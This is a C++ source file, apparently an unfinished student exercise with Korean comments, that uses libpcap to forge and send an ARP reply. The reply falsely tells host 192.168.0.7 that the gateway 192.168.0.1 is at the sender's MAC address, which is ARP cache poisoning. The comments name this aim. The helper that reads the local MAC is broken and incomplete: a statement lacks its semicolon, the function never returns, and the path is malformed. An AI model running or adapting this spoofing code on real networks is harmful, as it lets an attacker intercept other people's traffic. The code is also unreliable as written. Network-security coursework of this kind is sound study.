#include <cstdio>
#include <pcap.h>
#include <iostream>
#include <fstream>
#include <string>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1) // 구조체 패딩 비트에 대한 내용. pop 나올 때 까지 패딩을 없애겠단 뜻
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

using std::cout;
using std::ifstream;
using std::string;
using std::cerr;

void usage() {
	cout << "syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n";
	cout << "sample : send-arp wlan0 192.168.10.2 192.168.10.1\n";
}

// owner의 mac을 구해오는
int getMyMac(Mac& mac, string& dev) {
	// 리눅스의 경우
	// /sys/class/net/[dev]/address
	// 위 경로에 mac 주소가 char로 저장되어 있는데 eth0의 경우 argv에서 입력받은 dev를 넣어줘야될거 같음.
	ifstream fin;
	string path = "sys/class/net/" + dev +"/address";
	fin.open(path);

	// 에러 체크
	if (!fin.is_open()) {
		cerr << ""
	}
	
}

int main(int argc, char* argv[]) {
	// 입력 인자 개수가 4개 이상이어야 하며 짝수여야함.
	if (argc < 4 || argc % 2 != 0) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}


	// 1. 본인 맥, 얻기 ; IP는 몰라도 괜찮음 왜냐하면 패킷은 어차피 맥 타고 오니까?
	// 2. ARP Request / Reply로 victim, gateway 알아오기
	// 3. victim에게 본인이 gateway임을 알리는 Reply 보내기

	EthArpPacket packet;

	packet.eth_.dmac_ = Mac("92:dd:52:5c:ee:81");
	packet.eth_.smac_ = Mac("08:00:27:2b:b1:96");
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = Mac("08:00:27:2b:b1:96");
	packet.arp_.sip_ = htonl(Ip("192.168.0.1"));
	packet.arp_.tmac_ = Mac("92:dd:52:5c:ee:81");
	packet.arp_.tip_ = htonl(Ip("192.168.0.7"));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	pcap_close(handle);
}
